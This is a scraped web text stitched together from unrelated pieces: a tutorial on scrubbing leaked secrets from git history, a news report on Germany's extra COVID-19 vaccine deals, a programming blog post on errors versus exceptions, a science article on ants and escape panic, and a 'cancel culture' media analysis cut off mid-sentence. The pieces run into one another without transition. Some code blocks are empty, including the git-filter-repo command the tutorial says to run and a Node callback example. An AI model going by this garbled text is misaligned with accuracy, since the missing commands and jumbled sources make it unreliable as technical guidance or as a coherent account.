<!--kg-card-end: markdown--><p>Let the others affected know that a secret was found that needs to be excised from everyone’s git history. When you edit the git history to remove a file, it can cause problems with your teammates’ local clones; moreover, they can end up re-inserting the secret back into the public repository when they push their work. So it is important that everyone affected is in sync for the excision to work. This means that everyone needs to stop what they are doing, close outstanding PRs, and push up work that’s in progress.</p><p>Now, let’s make a fresh clone.</p><ul><li>Delete your existing clone in its entirety.</li><li>Make a fresh clone with `git clone [repository URL]`</li><li>Change into the project directory with `cd [project name]`</li><li>Download the entire repository history: `git pull --all --tags`.</li></ul><!--kg-card-begin: markdown--><p>The last step will look a little bit familiar. <code>git pull</code> tells git to grab updates from the remote repository, and apply them in the current branch (when it makes sense to do so, that is, when the local branch is set to track a remote branch). But git is smart, it doesn’t pull everything down, only what’s needed. This is where the <code>--all</code> flag comes in. This flag tells git to grab every branch from the remote repository. And the <code>--tags</code> flag tells git to grab every tag as well. So this command tells git to download the entire repository history, a complete and total clone. We have to do this, because it is possible that the commit containing the secret exists in more than one branch or tag. We need to ensure we don’t just scrub our secret from a portion of the repository history. As a result, this command can take a very long time, if the repository is very large.</p>
<!--kg-card-end: markdown--><p>Move on to the next step.</p><h2 id="the-secret-is-in-the-last-commit-and-there-s-nothing-else-in-the-last-commit">The secret is in the last commit, and there’s nothing else in the last commit</h2><p>In this case, we can drop the last commit in its entirety. We do this with</p><!--kg-card-begin: markdown--><pre><code>git reset --hard HEAD~1
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>What does this command do? Let’s break it apart a little bit. <code>git reset</code> is how we tell git that we want to undo recent changes. Normally, this command by itself tells git to unstage anything we’ve added with <code>git add</code>, but haven’t committed yet. This version of resetting isn’t sufficient for our purposes. But <code>git reset</code> is more flexible than that. We can tell git to take us back in time to a previous commit as well.We do that by telling git which commit to rewind to. We can use a commit’s identified (it’s “SHA”), or we can use an indirect reference. <code>HEAD</code> is what git calls the most recent commit on the checked out branch. <code>HEAD~1</code> means “the first commit prior to the most recent” (likewise <code>HEAD~2</code> means “two commits prior to the most recent”).<br>
Finally, the <code>--hard</code> tells git to throw away any differences between the current state and the state we’re resetting to. If you leave off the <code>--hard</code> your changes, including the secret, won’t be discarded. With <code>--hard</code>, the differences will be deleted, gone forever (which is precisely what we want!).</p>
<!--kg-card-end: markdown--><p>Once you’ve done a hard reset, that’s it! You’re done. Your work has been destructively undone, and you can pick back up where you were.</p><h2 id="the-secret-is-in-the-last-commit-but-there-were-other-changes-too">The secret is in the last commit, but there were other changes too</h2><p>In this case, we don’t want to completely drop the last commit. We want to edit the last commit instead. Edit your code to remove the secrets, and then add your changes as usual. Then, instead of making a new commit, we’ll tell git we want to amend the previous one:</p><!--kg-card-begin: markdown--><pre><code>git add [FILENAME]
git commit --amend
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>We all know <code>git commit</code>, but the <code>--amend</code> flag is our friend here. This tells git that we want to edit the previous commit, rather than creating a new one. We can continue to make changes to the last commit in this way, right up until we’re ready to either push our work, or start on a new commit.</p>
<!--kg-card-end: markdown--><p>Once you’ve amended the commit, you’re done!

In anything but the simplest cases, we are going to want a more powerful tool to help us do a deep clean of the repository We’re going to use <code>git-filter-repo</code>, a tool recommended by the git maintainers that will help us to rewrite history in a more user-friendly way than the native git tooling.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>A technical aside to those familiar with the concept of rebasing. (If you don’t know what that means, feel free to skip this paragraph.) All of the cases covered below can of course be managed using native git tools, particularly by rebasing. Sometimes rebasing is relatively painless, of course, but in the kinds of scenarios we're presenting here, rebasing is going to be a tedious and deeply error-prone process. This is why I am favoring purpose-built tools like git-filter-repo over rebasing. It is far better to avoid opening the possibility for making mistakes. From my own personal experience, recovering from a botched rebase is extremely time consuming, and often nearly impossible. Better to use the right tool for the job.</p>
<!--kg-card-end: markdown--><p>First, install </p><!--kg-card-begin: markdown--><pre><code>git-filter-repo
</code></pre>
<!--kg-card-end: markdown--><p>Next, let’s assess the situation to determine which technique is right for your situation. Sometimes secrets are files, and sometimes secrets are lines of code. For example, if you accidentally committed an SSH key or TLS certificate file, these are contained in specialized files that you’ll need to excise. On the other hand, maybe you have a single line of code containing an API key that’s part of a larger source file. In that case, you want to modify one or more lines of a file without deleting it.</p><p>Git-filter-repo can handle both cases, but requires different syntax for each case.</p><h2 id="excise-an-entire-file">Excise an entire file</h2><!--kg-card-begin: markdown--><p>To tell <code>git-filter-repo</code> to excise a file from the git history, we need only a single command:</p>

</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>The <code>--use-base-name</code> option tells <code>git-filter-repo</code> that we are specifying a filename, and not a full path to a file. You can leave off this option if you would rather specify the full path explicitly.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>Normally, <code>git-filter-repo</code> works by ignoring the filenames specified (they are, as the name suggests, filtered out). But we want the inverse behavior, we want <code>git-filter-repo</code> to ignore everything except the specified file. So we must pass <code>--invert-paths</code> to tell it this. If you leave off the <code>--invert-paths</code>, you’ll excise everything except the specified file, which is the exact opposite of what we want, and would likely be disastrous. Please don’t do that.</p>
<!--kg-card-end: markdown--><h3 id="edit-a-file-without-removing-it">Edit a file without removing it</h3><p>If you only need to edit one or more lines in a file without deleting the file, <code>git-filter-repo</code> takes a sequence of search-and-replace commands (optionally using regular expressions).</p><p>First, identify all the lines containing secrets that need to be excised.

<p>When it comes to EU vaccine solidarity, Germany is looking to have its cake and eat it, too.&nbsp;</p>



<p>While Berlin championed the bloc's joint purchasing of coronavirus vaccines while holding the European Union's rotating presidency in the second half of 2020, it simultaneously made additional agreements with vaccine producers — including BioNTech/Pfizer and CureVac — for extra doses. And it's now purchasing additional vaccines other EU countries didn't want.&nbsp;</p>



<p>Germany, a country of 83 million people, said it's getting 94 million doses of the BioNTech/Pfizer vaccine, 64 million from the EU and 30 million from a separate bilateral deal. On top of that, Berlin will buy doses that other countries don't buy, securing<strong> </strong>50 million of 160 million Moderna doses — far more than its pro-rata allocation. </p>



<p>Countries can, in the end, choose to purchase fewer vaccines — and Germany's approach to snap up the leftovers seems to be catching on. France, too, has already begun to purchase some leftover doses, Agnès Pannier-Runacher, delegate minister in charge of industry, said Thursday. Denmark also is doing this.</p>



<p>Still, Germany’s actions are technically a violation of the Commission’s vaccination strategy<strong>, </strong>as the bloc agreed to allocate coronavirus vaccines by population and not talk bilaterally with the companies it was negotiating with. But a Commission official said it complies with "the spirit of the EU vaccine agreement" because Germany’s extra doses will come after the Commission’s supply. </p>



<p>The Commission official added that the EU will purchase a “substantial amount of additional doses” from BioNTech/Pfizer coming, reportedly <a href="https://www.politico.eu/?p=1564473">between 50-100 million</a>.</p>



<p>Others are not convinced. Massimo&nbsp;Galli, director of the Infectious Diseases Center of the Sacco Hospital in Milan, called it "wrong, and not a nice thing to hear about," while <a href="https://nos.nl/artikel/2363315-kritiek-groeit-duitsland-bestelt-veel-meer-vaccins-dan-rest-eu.html" target="_blank">Dutch MEP Mohammed Chahim</a> called it "pure vaccine nationalism."</p>



<p>The German government has spent the past week under fire domestically as well. Both politicians and media are blaming the federal government, specifically German Health Minister Jens Spahn, for failing to secure sufficient doses, calling the EU purchase a vaccination “disaster."</p>



<p>The issue, though, is that many EU countries bet big that Oxford/AstraZeneca — the cheapest vaccine the Commission secured, at less than €2 — would be first to get regulatory approval, and they didn’t want to bank on pricier, more complicated mRNA vaccines, three EU diplomats said. </p>



<p>One of these diplomats said that Germany pushed EU countries to purchase another 100 million doses of the BioNTech vaccine in September after the original discussions were complete. EU countries declined, however, because they considered the vaccine too expensive and difficult to store. Germany then signed its own deal for 30 million extra doses.</p>



<p>The BioNTech vaccine is the second most expensive in the EU’s portfolio at €12 per dose, while Moderna's is the most expensive at nearly €15, according to <a href="https://www.politico.eu/article/belgian-secretary-of-state-accidentally-reveals-eu-vaccine-prices/">a price list accidentally published</a> in December.&nbsp;</p>



<p>“Not all member states are in good financial shape,” the second EU diplomat explained.</p>



<p>The third diplomat added that the dry ice required for the BioNTech/Pfizer vaccine “seemed like a hassle,” while Germany “lobbied for more doses.”&nbsp;</p>



<h3>One for all, all for one?</h3>



<p>Germany’s mRNA gamble might pay off, as it will land a total of nearly 100 million doses of the BioNTech/Pfizer vaccine. The government said it will get 64 million doses from the EU's procurement and another 30 million doses on top of the EU’s vaccination strategy. (The Commission would not confirm these numbers.)</p>



<p>Meanwhile, Germany's population size should have meant that it would receive roughly 30 million doses of the Moderna vaccine; instead, the government said it's purchasing extra doses from EU countries that didn't order their full allocation of the<em> </em>expensive jab.&nbsp;</p>



<p>It's not certain which countries aren't purchasing their full orders, as neither the Commission nor Moderna would confirm how many doses each country is ordering. Calculations by POLITICO, using publicly available figures, indicate that several EU countries may have purchased fewer doses than they were eligible to buy — although not all information is clear or up-to-date.&nbsp;</p>



<p>Poland, for example, will order only 6.6 million Moderna vaccines despite being eligible for over 13 million doses. Bulgaria secured 500,000 doses, about two million fewer than it could have purchased. </p>



<p>Greece also bought less than its permitted share, purchasing 1.8 million doses when it could have scooped up around two million extra.&nbsp;In addition, Belgium has ordered two million doses of the Moderna vaccine when its population size would have allowed it to secure around four million.</p>



<p>Portugal also said it would purchase a total of 2.8 million doses of the Moderna jab — below the share of doses it is eligible for based on its population size.&nbsp;“Portugal received, or is going to receive, all the vaccines it wanted to purchase,” Portugal’s Health Minister Marta Temido said.</p>



<p>None of these countries has confirmed whether their unclaimed doses are going to Germany, but Temido said Portugal’s doses were going to a pot for other EU countries to buy from.&nbsp;</p>



<p>When <a href="https://www.politico.eu/?p=1537322">asked in December </a>whether its extra deals violate the strategy, Spahn said the country approached BioNTech (and CureVac) only "once EU procedures had been concluded [and] when it became clear that all 27 member states would procure vaccines which reflected their needs."</p>



<p>“We thought, we’re going to find a larger number, but there was not really a larger need from member states at that stage,” Spahn added.</p>



<p>There remains the issue of how much the Commission knew, and when.</p>



<p>Until this week, it did not acknowledge any bilateral agreements EU countries had with vaccine producers.</p>



<p>On Wednesday, the Commission acknowledged Berlin’s separate deal with BioNTech but said its understanding was that the doses would come from the Commission’s 100 million top-up in December.</p>



<p>On Thursday, however, a Commission official acknowledged the existence of Germany’s separate agreement.&nbsp;</p>



<p>And late on Thursday, the French government said it, too, would get extra doses by purchasing leftovers from other countries. “We indeed have a strategy for the second round where we can take more [doses] or not. We have been able to do so in some specific cases,” Pannier-Runacher told reporters.</p>



<p>Pannier-Runacher declined on Thursday to communicate the number of doses, saying the government wanted to have “institutionalized and European” communication on this.</p>



<p>The deals and the small purchase numbers underscore how some EU countries didn't want to fork over the money for the mRNA vaccines. In November, <a href="https://www.mediapool.bg/koga-i-kak-shte-doidat-parvite-vaksini-sreshtu-covid-19-u-nas-news315073.html" target="_blank">Bulgarian media</a> reported that the country didn't even want to purchase vaccines that required ultra-cold storage. It later changed course and signed on to all the EU vaccine deals. Government officials had also <a href="https://www.mediapool.bg/bulgaria-shte-kupuva-ot-vsichki-dogovoreni-v-es-vaksini-sreshtu-covid-19-news314483.html" target="_blank">expressed fears that Bulgaria would in fact have too many vaccines</a> through the EU mechanism.&nbsp;</p>



<p>Countries have “some regret now,” the third EU diplomat said, which is why they “badly want to get more … now.” </p>



<p>Other countries haven't properly prepared to use them, so they’re waiting for the Oxford/AstraZeneca vaccine to be approved this spring  —“they’ve invested a lot” in that one, said the second EU diplomat. At the earliest, European regulators said they would make a decision about the British vaccine by the end of the month.</p>



<p>The third EU diplomat conceded the vaccine strategy is not a “proper international agreement as such, [but] more of a gentleman’s agreement.” So there is "no way to sanction anyone. And [the Commission is] trying to make it look correct now." </p>



<p>The diplomat added that this isn't an issue: "As long as the EU contracts are delivered as promised, it’s OK."</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
  <h2 id="tldr"><a href="#tldr">TL;DR</a></h2>
  <ul>
    <li>Errors are unrecoverable, Exceptions are routine.</li>
    <li>Most languages (Java, PHP) build the distinction into the language. Yet others (Go) name them the other way round. Some languages (JavaScript, Python) treat them as synonyms.</li>
    <li>No matter what way you name things, you should handle Errors and Exceptions separately in your code or bad things happen.</li>
  </ul>
  <p>Because I started out in JS/Python and then went to Go, without touching Java, getting this distinction right took me a few hours of thinking and research. It's not self-evident!</p>
</section>
<section>
  <h2 id="context"><a href="#context">Context</a></h2>
  <p>If you've ever <code>throw</code>n an error in a function <em>expecting</em> its invoker to <code>catch</code> it, <strong>you're doing it wrong</strong>.</p>
  <blockquote>
    <p>Ok, I'll admit I'm just hamming up a mere opinion for a more eye-catching opening. But I do feel strongly about this so...</p>
  </blockquote>
  <p>I was recently reminded of this while going through the Go FAQ and being reminded that <a href="https://golang.org/doc/faq#exceptions">Go does not have exceptions</a>.</p>
  <p><em>What?</em> If you've always coded in a language that has exceptions, this ought to jump out at you.</p>
  <p><strong>Go does not have <code>try</code> or <code>catch</code>.</strong> Despite those language constructs existing for decades, Go chose to have <a href="https://blog.golang.org/defer-panic-and-recover">Defer, Panic, and Recover</a> instead. By convention and design, Go encodes an extremely strong opinion that <strong>errors should be returned, not thrown</strong>.</p>
</section>
<section>
  <h2 id="but-why"><a href="#but-why">But Why</a></h2>
  <p>Relying on <em>exception</em> handling to handle <em>errors</em> either leads to convoluted code or unhandled errors.</p>
  <p>This kind of code is common in JavaScript:</p>
  <pre><code><span>function</span><span> </span><span>trySomethingRisky</span><span>(</span><span>str</span><span>)</span><span> </span><span>{</span>
<span>		</span><span>if</span><span> (</span><span>!</span><span>isValid</span><span>(</span><span>str</span><span>)) </span><span>throw</span><span> </span><span>new</span><span> </span><span>Error</span><span>(</span><span>'</span><span>invalid string!</span><span>'</span><span>)</span>
<span>		</span><span>return</span><span> </span><span>"</span><span>success!</span><span>"</span>
<span>}</span>

<span>function</span><span> </span><span>main</span><span>()</span><span> </span><span>{</span>
<span>	</span><span>try</span><span> </span><span>{</span>
<span>		</span><span>return</span><span> </span><span>trySomethingRisky</span><span>(</span><span>prompt</span><span>(</span><span>'</span><span>enter valid name</span><span>'</span><span>))</span>
<span>	</span><span>}</span><span> </span><span>catch</span><span> (</span><span>err</span><span>) </span><span>{</span>
<span>		</span><span>if</span><span> (</span><span>err</span><span> </span><span>instanceof</span><span> </span><span>Error</span><span>) </span><span>{</span>
<span>			</span><span>// handle exceptions</span>
<span>		</span><span>}</span><span> </span><span>else</span><span> </span><span>{</span>
<span>			</span><span>// handle errors</span>
<span>		</span><span>}</span>
<span>	</span><span>}</span>
<span>}</span>
</code></pre>
  <p>If you're thinking that you don't write this sort of code very often, you're probably not thinking through your failure modes enough.</p>
  <ul>
    <li>JavaScript doesn't have a native way to indicate whether a function can throw, if you invoke it. So <strong>you cannot lint against it</strong> — you must either pay this cost earlier in manual code review or later in bug reports.</li>
    <li>An innocent <code>fs.readFileSync</code> call can bring down a whole server (<a href="https://github.com/mcollina/make-promises-safe">or memory-leak descriptors</a>) given the wrong string.</li>
    <li>Promise calls without a <code>catch</code> in the browser will simply log silent errors (a terrible user experience).</li>
  </ul>
  <p>The more function and module boundaries you cross, the more you need to think about defensively adding <code>try</code>/ <code>catch</code> and handling the gamut of errors that can happen, and the harder it is to trace where errors begin and where they are handled.</p>
  <blockquote>
    <p>Aside - some authors like <a href="https://www.reddit.com/r/golang/comments/9t7con/why_no_trycatch_in_golang_whats_the_theory_behind/e8ust3m/">this Redditor</a> and <a href="https://mattwarren.org/2016/12/20/Why-Exceptions-should-be-Exceptional/">Matt Warren</a> make a performance driven argument for encouraging developers to not overuse exceptions. Exceptions involve a memory and compute intensive stack search. This matters at scale, but most of us will never run into this so I choose not to make a big deal out of it.</p>
  </blockquote>
</section>
<section>
  <h2 id="errors-vs-exceptions"><a href="#errors-vs-exceptions">Errors vs Exceptions</a></h2>
  <p>Let's attempt a definition:</p>
  <ul>
    <li><strong>Exceptions are expected failures</strong>, which we should recover from.</li>
    <li><strong>Errors are unexpected failures</strong>. By definition, we cannot recover elegantly from <em>unexpected</em> failures.</li>
  </ul>
  <p>You might notice the ironic inversion - it is <em>errors</em> that are "exceptional", while <em>exceptions</em> are routine. This was very confusing to your humble author.</p>
  <p>This is no doubt due to the fact that <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Control_flow_and_error_handling#exception_handling_statements">JavaScript</a>, <a href="https://docs.python.org/3/tutorial/errors.html">Python</a>, and other languages treat errors and exceptions as synonyms. So we throw <code>Error</code>s when we really mean to throw exceptions.</p>
  <p><a href="https://www.guru99.com/error-handling-and-exceptions.html">PHP</a> and <a href="https://stackoverflow.com/questions/5813614/what-is-difference-between-errors-and-exceptions">Java</a> seem to have this difference baked into the language.</p>
  <p>To make things extra confusing, Go uses <code>error</code> where other languages would call exceptions, and relies on <code>panic</code> to "throw" what other languages would call errors.</p>
  <blockquote>
    <p>Notes: Chris Krycho observes that you can use Rust, F#, and Elm's <code>Result</code> in a similar way, and Haskell's <code>Either</code>.</p>

<section>
  <h2 id="exception-handling-vs-error-checking"><a href="#exception-handling-vs-error-checking">Exception Handling vs Error Checking</a></h2>
  <p>The realization that we need different paradigms for handling errors and exceptions is of course not new. <a href="https://en.wikipedia.org/wiki/Exception_handling#Criticism">Wikipedia's entry on Exception Handling</a> quotes Tony Hoare (<a href="https://en.wikipedia.org/wiki/Tony_Hoare">creator of QuickSort, CSP and the null reference</a>) saying that exception handling is "<strong>dangerous. Do not allow this language in its present state to be used in applications where reliability is critical.</strong>"</p>
  <p>That was said in 1980, yet here we are 40 years later.</p>
  <p>The alternative to exception handling is error checking.</p>
  <section>
    <h3 id="error-checking-in-go"><a href="#error-checking-in-go">Error Checking in Go</a></h3>
    <blockquote>
      <p>Note: Go seems to have a strong opinion that "Errors" are routine and Exceptions (not formally named, but used in <code>panic</code>) are Exceptional - in direct opposition to other languages. I have opted to use Go-native terminology - minimizing confusion locally at the cost of increasing global confusion.</p>
    </blockquote>
    <p><a href="https://blog.golang.org/errors-are-values">Errors are values</a> in Go — made to be passed, not thrown. Go's FAQ is worth quoting here:</p>
    <p><em>We believe that coupling exceptions to a control structure, as in the try-catch-finally idiom, results in convoluted code. It also tends to encourage programmers to label too many ordinary errors, such as failing to open a file, as exceptional.</em></p>
    <p>When something goes wrong, your default choice should be using multi-value returns to report errors:</p>
    <pre><code><span>i</span><span>,</span><span> err </span><span>:=</span><span> strconv</span><span>.</span><span>Atoi</span><span>(</span><span>"</span><span>42</span><span>"</span><span>)</span>
<span>if</span><span> err </span><span>!=</span><span> </span><span>nil</span><span> </span><span>{</span>
<span>    fmt</span><span>.</span><span>Printf</span><span>(</span><span>"</span><span>couldn't convert number: %v</span><span>\n</span><span>"</span><span>,</span><span> err</span><span>)</span>
<span>    </span><span>return</span>
<span>}</span>
<span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"</span><span>Converted integer:</span><span>"</span><span>,</span><span> i</span><span>)</span>
</code></pre>
    <p>This pattern would be subject to the same weaknesses I outlined above, except for the fact that Go will refuse to compile if you 1) don't assign all returned values at the callsite or 2) don't use values that you assign. These two rules combined guide you to handle all errors explicitly near their origin.</p>
    <p>Exceptions still have a place — but the language reminds you how rarely you should use it, by calling it <code>panic()</code>. You can still <code>recover()</code> and treat it like a backdoor <code>try</code>/ <code>catch</code> in Go, but you will get judgy looks from all Gophers.</p>

    <h3 id="error-checking-in-node"><a href="#error-checking-in-node">Error Checking in Node</a></h3>
    <p>JavaScript lacks the 2 features I mention above to force you to handle errors.</p>
    <p>To work around this and gently nudge you, Node uses <a href="https://nodejs.org/api/errors.html#errors_error_first_callbacks">error-first callbacks</a>:</p>
    <pre><code><span>const</span><span> fs </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>fs</span><span>'</span><span>)</span><span>;</span>

</code></pre>
    <p>This pattern is idiomatic in most Node libraries, but the further we get away from Node, the more we tend to forget that there is an alternative to throwing errors, when writing libraries and app code.</p>
    <p>Lastly, it is tempting to <code>promisify</code> those callbacks:</p>
    <pre><code><span>const</span><span> util </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>util</span><span>'</span><span>)</span><span>;</span>
<span>const</span><span> fs </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>fs</span><span>'</span><span>)</span><span>;</span>

<span>const</span><span> stat </span><span>=</span><span> util</span><span>.</span><span>promisify</span><span>(fs</span><span>.</span><span>stat)</span><span>;</span><span> </span><span>// i am using fs.stat here, but could be any error-first-callback userland function</span>

<span>// assuming top-level await</span>
<span>try</span><span> </span><span>{</span>
<span>	</span><span>const</span><span> </span><span>stats</span><span> </span><span>=</span><span> </span><span>await</span><span> </span><span>stat</span><span>(</span><span>'</span><span>.</span><span>'</span><span>)</span>
<span>	</span><span>// do something with stats</span>
<span>}</span><span> </span><span>catch</span><span> (err) </span><span>{</span>
<span>	</span><span>// handle errors</span>
<span>}</span>
</code></pre>
    <p>And we are right back where we started - being able to fling errors and exceptions arbitrarily high up and having to handle both in the same place.</p>

			<p><i>This article first appeared online in our “Symmetry” issue in May, 2014.</i></p>
<p><span>O</span>n an evening in January A.D. 532, pandemonium broke out in the Constantinople Hippodrome, a U-shaped chariot racetrack surrounded by stadium stands. Two factions, the Greens and Blues—the predecessors of today’s soccer hooligans—broke into a fight. When the rest of the spectators dashed to escape, many became trapped by the rushing crowd, couldn’t reach the exits, and were trampled and killed. That incident was the start of the Nika riots that almost ended the rule of Eastern Roman emperor Justinian the Great.</p> <p>Fifteen hundred years later, not much has changed. We still have stampedes, and still can’t get out of enclosed spaces properly. Since 2009, there have been fatal stadium stampedes in Morocco, Cote d’Ivoire, Bangkok, and Egypt. In their study of escape panic, Swiss physicist and sociologist Dirk Helbing concluded together with his colleagues that, “physical interactions in [a] jammed crowd add up and cause dangerous pressures… which can bend steel barriers or push down brick walls.”</p> <figure data-alt="Mhrvold_BREAKER" data-title="null" data-capper="null" data-credits="null"><img src="http://static.nautil.us/3252_1e3b21cb226c39b6aa4634f820b372f3.png" alt="" width="733"></figure><p>Some animals evolved to clump together when threatened because it increased their chances of survival. “Predators have the ability to focus and concentrate on individual prey,” says Ralph Tollrian, a professor in Germany who has spent his career studying the predator confusion effect. “When they handle one prey, they can’t hunt the next.” Birds and fish form groups that move chaotically in the presence of a predator, giving it “cognitive overload,” says Randy Olson, who builds computer models of predator and prey behavior at Michigan State University. The predator’s cognitive overload can be so strong that it may give up on its pursuit entirely. “A confused predator can sometimes become frustrated and not hunt at all,” Tollrian says.</p> 

 <p>Humans, too, developed a tendency to clump together in the face of danger. There are many advantages to that, Tollrian says—from defense (it’s easier for a group to fight off a threat) to safety in numbers (people can hide in a crowd). When humans moved to agrarian and urban lifestyles, our dangers changed—but our responses didn’t, says Randolph Nesse, a professor of psychiatry at Arizona State University who studies the evolutionary reasons behind anxiety. “We continue to be afraid of things that were dangerous to our ancestors,” Nesse says. When we panic, ancient instincts kick in. In a room with six exits, it seems like the most logical course of action would be for the crowd to divide evenly among all six. Instead, we stampede to just one. We disregard logic and get injured.</p>

</div> <p>While we may not be able to unlearn our instincts, we might circumvent them if we better understand the nature of escape panic. Since studying panicking humans is difficult, scientists are turning to an unexpected source of inspiration: ants.</p> <p>“Humans and ants are hugely different animals,” says physicist Ernesto Altshuler at the University of Havana, Cuba, who studied how ants escape in emergency situations. “But when you are in panic, humans behave in a very elementary way, and we may look a little bit like ants.” In <a href="http://www.complexperiments.net/Ants/SymBreak/Papers/AmNat05.pdf" target="_blank">a 2005 paper</a>, Altshuler describes an experiment in which he placed black Cuban ants in a circular white petri dish with two exits placed symmetrically on opposite sides of the dish. When he dropped an ant-repelling fluid into the dish’s center, more ants consistently stampeded toward one of the exits than the other, replicating the asymmetrical behavior that people can exhibit.</p> 



 <p>Here, in plain sight, was stampeding behavior common to people and ants. In fact, the correspondence goes further than that. Nirajan Shiwakoti, who studies crowd dynamics at Monash University in Melbourne, Australia, showed in 2011 that the mathematics describing ant escape are <a href="http://users.monash.edu.au/~msarvi/paper1.pdf" target="_blank">similar to those</a> describing human escape. “Ants naturally form collective traffic and follow physical paths in ways that resemble human crowd movement,” he says. </p> <p>Shiwakoti recognized an opportunity: He could make an animal model, not for human disease, but for human panic. So he began to experiment with the location and nature of exits that his ants would face, and discovered something surprising. Creatively obstructing the flow of the panicked ant crowd <a href="http://www.sciencedirect.com/science/article/pii/S0968090X13000910" target="_blank">sped its escape</a>.</p> 



 <p>Shiwakoti experimented with different exit scenarios using square petri dishes that had exits located in the middle of a side and in the corner. Shiwakoti found that an exit located in the middle of the wall with no obstacles in front of it was the least efficient set up. He measured the efficiency of an exit by the amount of time it took the ants to get through it. On average, it took 50 ants 18 seconds to get through an unobstructed mid-side exit. Adding a column in front of the mid-side exit reduced that time to 14 seconds. A corner exit with a column in front had an escape time of less than 11 seconds. But the best escape time was achieved with a corner exit without a column in front—less than 9.5 seconds.</p> 



 <p>“If you have an exit in the middle of the wall, you can imagine coming from the left side, the right side, and straight,” Shiwakoti says. These different streams of ants, or people, have to merge at the exit and take turns to pass. But people are impatient, and start pushing and shoving. Columns help structure the flow. “The column gives you some channels on the left and on the right, and this reduces the conflict at the exit.” The reason the corner exit is so efficient, Shiwakoti says, is because it has an intrinsic ability to structure the flow. “If the exit is in the corner, then people are probably only coming from left and right, so you have a more uniform flow.”</p> <p>Shiwakoti and his team are experimenting with placing barriers in front of the Melbourne football stadium exits that lead to the train station. The preliminary results look promising. “Just by having small architectural changes in the layout, or the train stations, or stadiums, you can have massive improvement in terms of evacuation rate,” Shiwakoti says. Perhaps we shouldn’t be surprised at the unexpected lessons we’re learning. Ants have been learning how to deal with congestion for millions of years. They might just show us the way out.</p>  <p><i>Conor Myhrvold writes about science, technology, and nature.

<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Have you ever felt uncomfortable sharing your opinion on politics — whether online or with friends? If so, you’re not alone. Americans are becoming increasingly cautious about sharing their political opinions. In a recent <a href="https://www.cato.org/publications/survey-reports/poll-62-americans-say-they-have-political-views-theyre-afraid-share#introduction" rel="noopener" target="_blank"><span>survey</span></a>, 62 percent of Americans described today’s political climate as one that “prevents them from saying things they believe because others might find them offensive.” Further, this was not a sentiment limited to one side of the political spectrum. More than half of liberals and three-quarters of conservatives are <a href="https://www.outsidethebeltway.com/62-of-americans-afraid-to-share-political-views/" rel="noopener" target="_blank"><span>hesitant to share</span></a> some of their political views. Both of these percentages have risen in recent years, in tandem with the rising debate over so-called “cancel culture.”&nbsp;&nbsp;</p>
<p>But it’s not just everyday Americans that feel limited in their speech. In July 2020, 153 notable academics, authors, journalists, and others published “<a href="https://harpers.org/a-letter-on-justice-and-open-debate/" rel="noopener" target="_blank"><span>A Letter on Justice and Open Debate</span></a>” in <em>Harper’s Magazine</em>. In the letter, signees ranging from liberal philosopher Noam Chomsky to conservative author David Brooks voice their concern over “cancel culture” and the preservation of free speech. While the extent to which “cancel culture” endangers free speech is debated, the letter demonstrates that some academics and media professionals consider it a serious threat.&nbsp;</p>
<p>This prompts several key questions: Does the media perpetuate the existence of “cancel culture?” What impact might this have on public discourse? In this week's analysis, The Factual reviews 38 articles from 25 sources across the political spectrum to explore the concept of “cancel culture” and how it is reported in the media.<br><!--more--></p>

<h4><strong>What Is “Cancel Culture?”&nbsp;</strong></h4>
<p>The definition isn’t simple, partially due to a growing contrast between the term’s literal definition and its use in politics and media. “Cancel culture” can be defined as a campaign of public shaming (conducted via social media, news, or in-person confrontation) such that the subject of the “cancellation” suffers devastating personal, monetary, or political consequences that appear to be disproportionate to the subject's offense.&nbsp;</p>
<p>Often, individuals or businesses will cut ties with the “cancelled” person in rapid succession and across industries. This creates a cascading effect where each person or business that cuts ties with the subject of the cancellation puts more pressure on those who have yet to do so. A person may become a candidate for cancellation if they are alleged to have done something so negative that they should not be afforded an opportunity for redemption. <strong>Central to the debate around “cancel culture” is this subjective threshold for what is worthy of “cancellation.”</strong></p>
<h4><strong>An Uneven Standard </strong></h4>
<p>There is no central authority that issues “cancellations” and oversees appeals. Instead, an amorphous group of internet users, politicians, and media professionals contribute to “cancel culture” on the basis of what happens to be in front of them. This produces a highly stratified environment where backlash is sometimes dispassionately cruel and at other times extremely exaggerated.</p>
<p>The term "cancel culture" has seen renewed debate in response to the Twitter <a href="https://blog.twitter.com/en_us/topics/company/2020/suspension.html" rel="noopener" target="_blank">ban</a> of former President Trump. <span>However, President Trump’s Twitter ban relates to violations of the platform’s terms of service and requires a more specific examination than the general “cancel culture” phenomenon.</span></p>

<h4><strong>Examples Of “Cancel Culture”</strong></h4>
<p>Legitimate examples of “cancel culture” gone overboard often stem from false inferences. One such <a href="https://nymag.com/intelligencer/2020/07/david-shor-cancel-culture-2020-election-theory-polls.html" rel="noopener" target="_blank"><span>example</span></a> occurred when a data scientist, David Shor, <a href="https://twitter.com/jenbrea/status/1271148784316108800" rel="noopener" target="_blank"><span>retweeted</span></a> a report regarding the effectiveness of various protest methods in regards to achieving policy change. This report was discussed by many as <a href="https://blog.thefactual.com/reforming-police-george-floyd-defund" rel="noopener" target="_blank"><span>protests</span></a> grew in response to the killing of George Floyd. The data scientist was <a href="https://nymag.com/intelligencer/2020/06/case-for-liberalism-tom-cotton-new-york-times-james-bennet.html" rel="noopener" target="_blank"><span>fired</span></a> from his job as some equated his sharing of the report to condemnation of protests taking place. However, the report was originally authored by Omar Wasow, a Black man with a <a href="https://politics.princeton.edu/people/omar-wasow" rel="noopener" target="_blank"><span>PhD</span></a> in African American Studies. The original <a href="https://www.cambridge.org/core/services/aop-cambridge-core/content/view/136610C8C040C3D92F041BB2EFC3034C/S000305542000009Xa.pdf/agenda_seeding_how_1960s_black_protests_moved_elites_public_opinion_and_voting.pdf" rel="noopener" target="_blank"><span>report</span></a> was an 